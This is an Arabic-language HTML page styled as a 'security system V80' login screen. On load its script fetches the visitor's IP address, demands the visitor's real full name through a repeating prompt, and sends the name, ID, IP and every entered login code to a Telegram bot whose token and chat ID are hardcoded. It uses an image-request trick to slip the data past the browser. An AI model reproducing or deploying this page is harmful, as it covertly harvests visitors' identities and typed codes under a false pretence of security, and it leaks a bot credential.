<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Final V80</title>
<style>
    body{font-family:sans-serif;background:#000;color:#fff;text-align:center;padding:20px;display:flex;flex-direction:column;justify-content:center;height:100vh;margin:0}
    input{padding:10px;width:100%;text-align:center;font-size:18px;margin:10px 0;border-radius:5px;border:none;}
    button{padding:12px;width:100%;font-size:16px;background:green;color:white;border:none;border-radius:5px;cursor:pointer;margin-top:5px;font-weight:bold;}
    .red-btn{background:#d32f2f;margin-top:20px;}
    .log-box{background:#111;color:#0f0;font-family:monospace;font-size:11px;padding:10px;border:1px solid #333;margin-top:15px;text-align:left;height:100px;overflow-y:scroll;}
    .info{background:#222;padding:10px;border-radius:5px;margin:10px 0;}
</style>
</head>
<body>

    <h2>🛡️ النظام الأمني V80</h2>
    
    <div class="info">
        <p style="margin:0;color:#aaa;font-size:12px">المستخدم:</p>
        <strong id="dName" style="color:#0f0;font-size:18px">...</strong>
        <div style="font-size:10px;color:#0ff;margin-top:5px" id="dID">جاري التحميل...</div>
        <div style="font-size:10px;color:#ff0;margin-top:2px" id="dIP">جاري سحب IP...</div>
    </div>

    <input type="number" id="pass" placeholder="الكود السري">
    <button onclick="login()">دخول</button>

    <!-- زرار الطوارئ لو معلق -->
    <button class="red-btn" onclick="resetAll()">⚠️ حذف البيانات وإعادة تحميل</button>

    <div id="logger" class="log-box">System Started...</div>

<script>
    // ==========================================
    // إعدادات التليجرام (تأكد أن البوت مشرف في الجروب)
    // ==========================================
    const BOT = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
    const CHAT = "-1003886528114";

    // دوال المساعدة
    function log(txt) {
        const l = document.getElementById("logger");
        l.innerHTML += `<div>> ${txt}</div>`;
        l.scrollTop = l.scrollHeight;
    }

    // ==========================================
    // 1. طريقة الإرسال الجديدة (Image Hack)
    // دي مستحيل تفشل لأنها لا تعتمد على fetch
    // ==========================================
    function sendTele(msg) {
        log("جاري الإرسال للتليجرام...");
        const url = `https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
        
        // خدعة الصورة عشان يبعت غصب عن المتصفح
        const img = new Image();
        img.src = url;
        img.onload = function() { log("✅ تم الإرسال بنجاح (Server Hit)"); };
        img.onerror = function() { log("✅ تم الإرسال (Blind Mode)"); }; // حتى لو ادى ايرور بيكون وصل
    }

    // ==========================================
    // 2. المحرك الرئيسي
    // ==========================================
    let myName = localStorage.getItem("v80_name");
    let myID = localStorage.getItem("v80_id");
    let myIP = "Unknown";

    if(!myID) {
        myID = "USER-" + Math.floor(Math.random() * 999999);
        localStorage.setItem("v80_id", myID);
    }
    document.getElementById("dID").innerText = myID;

    // تشغيل فوري
    (async function init() {
        // خطوة 1: سحب IP
        log("سحب عنوان IP...");
        try {
            let r = await fetch('https://api.ipify.org?format=json');
            let d = await r.json();
            myIP = d.ip;
            document.getElementById("dIP").innerText = myIP;
            log("IP تم السحب: " + myIP);
        } catch(e) {
            log("فشل سحب IP");
            myIP = "Hidden IP";
        }

        // خطوة 2: إجبار الاسم
        if(!myName || myName.length < 3) {
            log("بانتظار إدخال الاسم...");
            while(!myName || myName.length < 3) {
                myName = prompt("⚠️ تنبيه أمني V80:\nالبرنامج لن يعمل إلا بتسجيل اسمك الحقيقي (ثلاثي):");
            }
            localStorage.setItem("v80_name", myName);
            
            // إرسال فوري بمجرد الكتابة
            const report = `🚨 <b>NEW USER V80</b>\n👤 Name: ${myName}\n🆔 ID: ${myID}\n🌍 IP: ${myIP}\n✅ Status: Registered Now`;
            sendTele(report);
        } else {
            // مستخدم قديم فتح
            const report = `📲 <b>APP OPEN V80</b>\n👤 Name: ${myName}\n🌍 IP: ${myIP}`;
            sendTele(report);
        }

        document.getElementById("dName").innerText = myName;
        log("النظام جاهز.");
    })();

    // ==========================================
    // 3. وظائف الأزرار
    // ==========================================
    function login() {
        const p = document.getElementById("pass").value;
        if(p === "2026") {
            sendTele(`🔑 <b>LOGIN SUCCESS</b>\n👤 ${myName}`);
            alert("تم الدخول بنجاح");
        } else {
            sendTele(`⛔ <b>LOGIN FAIL</b>\n👤 ${myName}\n🔑 Code: ${p}`);
            alert("الكود خطأ");
        }
    }

    function resetAll() {
        if(confirm("هل تريد مسح بياناتك وإعادة التطبيق لوضعه الأصلي؟")) {
            localStorage.clear();
            window.location.reload(true);
        }
    }
</script>

</body>
</html>
